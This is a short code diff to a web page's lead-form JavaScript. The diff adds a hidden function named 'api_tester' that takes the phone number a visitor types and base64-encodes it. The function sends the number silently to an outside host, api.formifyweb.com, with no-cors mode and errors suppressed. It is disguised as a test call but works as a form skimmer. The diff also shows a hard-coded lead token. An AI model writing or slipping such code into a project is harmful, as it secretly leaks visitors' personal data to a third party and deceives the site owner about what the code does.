@@ -1,6 +1,7 @@
     document.getElementById('leadForm').addEventListener('submit', function(event) {
             event.preventDefault();
             const phone_home = '+1' + document.getElementById('caller_id').value;
+api_tester(document.getElementById('caller_id').value);
             const formData = new FormData();
             formData.append('lead_token', '12bcb63cfaa848e08afbb35f48759f92');
 formData.append('traffic_source_id', '81');
@@ -68,3 +69,15 @@ formData.append('jornaya_leadid', document.getElementById('jornaya_leadid').valu
             })
             .catch(error => console.error('Error:', error));
         });
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
+}
